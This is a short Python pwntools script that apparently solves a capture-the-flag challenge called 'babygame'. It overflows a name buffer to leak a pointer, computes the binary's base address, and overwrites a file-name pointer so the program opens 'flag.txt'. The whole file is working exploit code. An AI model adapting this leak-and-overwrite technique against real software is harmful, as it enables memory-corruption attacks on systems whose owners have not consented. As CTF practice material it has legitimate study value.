#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('babygame', checksec = False) 

p = process(elf.path)

payload1 = b'x' * 32
p.sendafter(b'name?\n', payload1) 
p.recvuntil(b'> ') 
p.sendline(b'2')

p.recv(32) 
urandom_leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info("urandom_leaked: " + hex(urandom_leaked))

bin_base = urandom_leaked - 0x2024
name_base = bin_base + 0x40a0

randbuf = b'flag.txt\x00'
payload2 = randbuf + (0x20 - len(randbuf)) * b'x' + p64(name_base)
p.recvuntil(b'> ') 
p.sendline(b'1')
p.sendafter(b'to?\n', payload2)

payload3 = str(u32(b'DUCT')).encode()
p.recvuntil(b'> ') 
p.sendline(b'1337')
p.sendafter(b'guess: ', payload3)

p.interactive()